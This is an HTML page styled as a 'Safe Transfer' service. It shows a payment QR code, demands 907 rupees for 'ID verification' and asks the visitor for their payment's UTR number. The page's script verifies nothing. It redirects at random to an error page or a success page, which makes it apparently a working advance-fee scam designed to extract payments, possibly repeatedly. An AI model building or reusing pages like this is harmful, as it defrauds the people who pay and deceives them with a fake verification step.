<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Safe Transfer</title>
    <style>
        /* (Keep your existing styles) */
        .error {
            color: #ff4d4d;
            margin-top: 5px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="banner">
        <img src="https://i.postimg.cc/6QhgC3kb/image-search-1752245026702.png" alt="Banner">
    </div>
    
    <div class="container">
        <h1>SAFE TRANSFER</h1>
        
        <div class="message">
            <p>SAFE TRANSFER & WITHOUT GETTING ANY BAN FULL SAFE</p>
        </div>
        
        <div class="qr-code">
            <img src="https://files.catbox.moe/znsnva.jpg" alt="Verification QR Code">
        </div>
        
        <p>PAYMENT - 907 RUPPES FOR ID VERYFICATION (SAFE)</p>
        
        <div class="form-group">
            <label for="utr">ENTER UTR:</label>
            <input type="text" id="utr" placeholder="Enter UTR number" required>
            <div id="utrError" class="error">Please enter a valid UTR</div>
        </div>
        
        <button class="submit-btn" onclick="validateAndSubmit()">CONTINUE</button>
    </div>

    <script>
        function validateAndSubmit() {
            const utr = document.getElementById('utr').value.trim();
            const errorElement = document.getElementById('utrError');
            
            if (!utr) {
                errorElement.style.display = 'block';
                return; // Stop if UTR is empty
            }
            
            // Simulate a random "error" (50% chance)
            const shouldError = Math.random() > 0.5;
            
            if (shouldError) {
                window.location.href = 'error.html';
            } else {
                // Redirect to a success page (create success.html)
                window.location.href = 'success.html';
            }
        }
    </script>
</body>
</html>
